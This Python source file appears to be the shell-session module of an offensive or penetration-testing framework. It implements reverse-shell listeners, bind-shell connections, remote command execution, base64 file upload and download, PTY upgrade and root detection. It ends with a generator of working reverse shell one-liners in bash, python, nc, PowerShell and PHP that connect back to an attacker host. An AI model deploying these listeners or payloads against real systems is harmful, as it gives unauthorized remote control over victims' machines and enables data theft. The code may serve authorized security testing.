"""Shell manager — reverse/bind shell session management."""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from enum import StrEnum

logger = logging.getLogger(__name__)


class ShellType(StrEnum):
    REVERSE = "reverse"
    BIND = "bind"
    SSH = "ssh"
    WEBSHELL = "webshell"


class ShellOS(StrEnum):
    LINUX = "linux"
    WINDOWS = "windows"
    UNKNOWN = "unknown"


@dataclass
class ShellSession:
    """Represents an active shell session."""

    id: str
    shell_type: ShellType
    host: str
    port: int
    os: ShellOS = ShellOS.UNKNOWN
    user: str = ""
    cwd: str = ""
    is_root: bool = False
    reader: asyncio.StreamReader | None = None
    writer: asyncio.StreamWriter | None = None
    _alive: bool = True
    _history: list[str] = field(default_factory=list)

    @property
    def alive(self) -> bool:
        return self._alive and self.writer is not None and not self.writer.is_closing()

    def as_dict(self) -> dict:
        return {
            "id": self.id,
            "type": self.shell_type.value,
            "host": self.host,
            "port": self.port,
            "os": self.os.value,
            "user": self.user,
            "is_root": self.is_root,
        }


class ShellManager:
    """Manages reverse/bind shell sessions.

    All network I/O is async. Sessions are tracked by ID for cross-plugin use.
    """

    def __init__(self) -> None:
        self._sessions: dict[str, ShellSession] = {}
        self._counter: int = 0
        self._servers: list[asyncio.Server] = []

    def _next_id(self) -> str:
        self._counter += 1
        return f"shell-{self._counter}"

    async def listen_reverse(
        self, port: int, *, timeout: float = 60.0,
    ) -> ShellSession | None:
        """Start a reverse shell listener and wait for a connection."""
        session_id = self._next_id()
        future: asyncio.Future[ShellSession] = asyncio.get_event_loop().create_future()

        async def on_connect(
            reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
        ) -> None:
            addr = writer.get_extra_info("peername")
            session = ShellSession(
                id=session_id,
                shell_type=ShellType.REVERSE,
                host=addr[0] if addr else "unknown",
                port=port,
                reader=reader,
                writer=writer,
            )
            self._sessions[session_id] = session
            if not future.done():
                future.set_result(session)

        try:
            server = await asyncio.start_server(on_connect, "0.0.0.0", port)
            self._servers.append(server)
            logger.info("Reverse shell listener on port %d", port)
            session = await asyncio.wait_for(future, timeout=timeout)
            await self._detect_session_info(session)
            return session
        except TimeoutError:
            logger.warning("Reverse shell listener timed out on port %d", port)
            return None
        except Exception:
            logger.exception("Reverse shell listener failed on port %d", port)
            return None

    async def connect_bind(
        self, host: str, port: int, *, timeout: float = 10.0,
    ) -> ShellSession | None:
        """Connect to a bind shell."""
        session_id = self._next_id()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout,
            )
            session = ShellSession(
                id=session_id,
                shell_type=ShellType.BIND,
                host=host,
                port=port,
                reader=reader,
                writer=writer,
            )
            self._sessions[session_id] = session
            await self._detect_session_info(session)
            return session
        except Exception:
            logger.exception("Bind shell connection to %s:%d failed", host, port)
            return None

    async def execute(
        self, session: ShellSession, command: str, *, timeout: float = 30.0,
    ) -> str:
        """Execute a command in a shell session and return output."""
        if not session.alive or session.writer is None or session.reader is None:
            return ""

        marker = f"__END_{id(command)}__"
        if session.os == ShellOS.WINDOWS:
            full_cmd = f"{command}\r\necho {marker}\r\n"
        else:
            full_cmd = f"{command}; echo {marker}\n"

        session.writer.write(full_cmd.encode())
        await session.writer.drain()

        output_parts: list[str] = []
        try:
            async with asyncio.timeout(timeout):
                while True:
                    chunk = await session.reader.read(4096)
                    if not chunk:
                        break
                    text = chunk.decode("utf-8", errors="replace")
                    if marker in text:
                        output_parts.append(text[:text.index(marker)])
                        break
                    output_parts.append(text)
        except TimeoutError:
            pass

        result = "".join(output_parts).strip()
        session._history.append(f"$ {command}\n{result}")
        return result

    async def upload(
        self, session: ShellSession, local_path: str, remote_path: str,
    ) -> bool:
        """Upload a file via shell (base64 encoding)."""
        import base64
        from pathlib import Path

        data = Path(local_path).read_bytes()
        b64 = base64.b64encode(data).decode()

        if session.os == ShellOS.WINDOWS:
            # PowerShell base64 decode
            cmd = (
                f'powershell -c "[IO.File]::WriteAllBytes(\'{remote_path}\','
                f'[Convert]::FromBase64String(\'{b64}\'))"'
            )
        else:
            cmd = f"echo '{b64}' | base64 -d > {remote_path}"

        result = await self.execute(session, cmd)
        return "error" not in result.lower()

    async def download(
        self, session: ShellSession, remote_path: str, local_path: str,
    ) -> bool:
        """Download a file via shell (base64 encoding)."""
        import base64
        from pathlib import Path

        if session.os == ShellOS.WINDOWS:
            cmd = (
                f'powershell -c "[Convert]::ToBase64String('
                f'[IO.File]::ReadAllBytes(\'{remote_path}\'))"'
            )
        else:
            cmd = f"base64 {remote_path}"

        result = await self.execute(session, cmd, timeout=60.0)
        if not result:
            return False
        try:
            data = base64.b64decode(result.strip())
            Path(local_path).write_bytes(data)
            return True
        except Exception:
            return False

    async def upgrade_to_pty(self, session: ShellSession) -> bool:
        """Attempt to upgrade a basic shell to a PTY (Linux only)."""
        if session.os == ShellOS.WINDOWS:
            return False

        upgrade_cmds = [
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "script -qc /bin/bash /dev/null",
        ]
        for cmd in upgrade_cmds:
            result = await self.execute(session, cmd, timeout=5.0)
            if result and "not found" not in result.lower():
                return True
        return False

    async def detect_os(self, session: ShellSession) -> ShellOS:
        """Detect the OS of a shell session."""
        result = await self.execute(session, "uname -s 2>/dev/null || ver", timeout=5.0)
        if "linux" in result.lower():
            session.os = ShellOS.LINUX
        elif "windows" in result.lower() or "microsoft" in result.lower():
            session.os = ShellOS.WINDOWS
        return session.os

    async def detect_user(self, session: ShellSession) -> str:
        """Detect the current user."""
        if session.os == ShellOS.WINDOWS:
            result = await self.execute(session, "whoami", timeout=5.0)
        else:
            result = await self.execute(session, "id", timeout=5.0)

        session.user = result.strip().split("\n")[0] if result else ""
        if session.os == ShellOS.LINUX:
            session.is_root = "uid=0" in result
        elif session.os == ShellOS.WINDOWS:
            session.is_root = any(
                x in result.lower() for x in ("system", "administrator")
            )
        return session.user

    async def _detect_session_info(self, session: ShellSession) -> None:
        """Auto-detect OS, user, and cwd for a new session."""
        await self.detect_os(session)
        await self.detect_user(session)
        if session.os == ShellOS.WINDOWS:
            session.cwd = await self.execute(session, "cd", timeout=5.0)
        else:
            session.cwd = await self.execute(session, "pwd", timeout=5.0)

    def get_session(self, session_id: str) -> ShellSession | None:
        return self._sessions.get(session_id)

    @property
    def active_sessions(self) -> list[ShellSession]:
        return [s for s in self._sessions.values() if s.alive]

    async def close_all(self) -> None:
        """Close all sessions and listeners."""
        for session in self._sessions.values():
            if session.writer and not session.writer.is_closing():
                session.writer.close()
            session._alive = False
        for server in self._servers:
            server.close()
        self._sessions.clear()
        self._servers.clear()

    @staticmethod
    def reverse_shell_payload(
        lhost: str, lport: int, *, lang: str = "bash",
    ) -> str:
        """Generate a reverse shell payload string."""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": (
                f"python3 -c 'import socket,subprocess,os;"
                f's=socket.socket();s.connect(("{lhost}",{lport}));'
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
            ),
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "powershell": (
                f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient"
                f"('{lhost}',{lport});$s=$c.GetStream();"
                f"[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0)"
                f"{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                f"$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\""
            ),
            "php": (
                f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
        }
        return payloads.get(lang, payloads["bash"])
